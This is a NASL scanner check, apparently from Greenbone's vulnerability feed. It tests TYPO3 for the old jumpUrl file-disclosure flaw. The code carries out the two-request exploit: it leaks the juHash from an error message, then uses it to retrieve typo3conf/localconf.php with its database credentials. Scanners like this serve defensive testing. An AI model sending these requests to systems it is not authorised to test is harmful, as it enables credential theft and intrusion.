CPE = "cpe:/a:typo3:typo3";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803989" );
	script_version( "2021-09-07T06:04:54+0000" );
	script_cve_id( "CVE-2009-0815", "CVE-2009-0816" );
	script_bugtraq_id( 33714 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-09-07 06:04:54 +0000 (Tue, 07 Sep 2021)" );
	script_tag( name: "creation_date", value: "2013-12-26 17:48:31 +0530 (Thu, 26 Dec 2013)" );
	script_name( "TYPO3 jumpUrl File Disclosure Vulnerability" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to steal the
  victim's cookie-based authentication credentials or access arbitrary file." );
	script_tag( name: "vuldetect", value: "Send a Crafted HTTP GET request and check whether it is able to fetch a
  remote file." );
	script_tag( name: "insight", value: "Multiple errors exist in the application:

  - An error exists in jumpUrl mechanism, which will disclose a hash secret.

  - An error exists in backend user interface, which fails to validate user
  supplied input properly." );
	script_tag( name: "solution", value: "Upgrade to TYPO3 version 4.0.12, 4.1.10, 4.2.6 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "This host is installed with TYPO3 and is prone to multiple vulnerabilities." );
	script_tag( name: "affected", value: "TYPO3 versions 3.3.x, 3.5.x, 3.6.x, 3.7.x, 3.8.x, 4.0 to 4.0.11,
  4.1.0 to 4.1.9, 4.2.0 to 4.2.5, 4.3alpha1" );
	script_xref( name: "URL", value: "http://www.securitytracker.com/id?1021710" );
	script_xref( name: "URL", value: "http://typo3.org/teams/security/security-bulletins/typo3-core/TYPO3-SA-2009-002/" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_typo3_detect.sc" );
	script_mandatory_keys( "TYPO3/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("url_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
if(!typoPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(typoLoca = get_app_location( cpe: CPE, port: typoPort )){
	url = "/?jumpurl=" + urlencode( str: "typo3conf/localconf.php" ) + "&type=0&juSecure=1&locationData=" + urlencode( str: "2:" );
	sndReq = http_get( item: NASLString( typoLoca, url ), port: typoPort );
	rcvRes = http_send_recv( port: typoPort, data: sndReq );
	hash = eregmatch( pattern: "jumpurl Secure: Calculated juHash, ([a-z0-9]+), did not match", string: rcvRes );
	if(hash[1]){
		hashURL = url + "&juHash=" + hash[1];
		sndReq = http_get( item: NASLString( typoLoca, hashURL ), port: typoPort );
		rcvRes = http_send_recv( port: typoPort, data: sndReq );
		if(rcvRes && IsMatchRegexp( rcvRes, "HTTP/1.. 200" ) && ContainsString( rcvRes, "$typo_db" ) && ContainsString( rcvRes, "$typo_db_username" )){
			security_message( typoPort );
			exit( 0 );
		}
	}
}

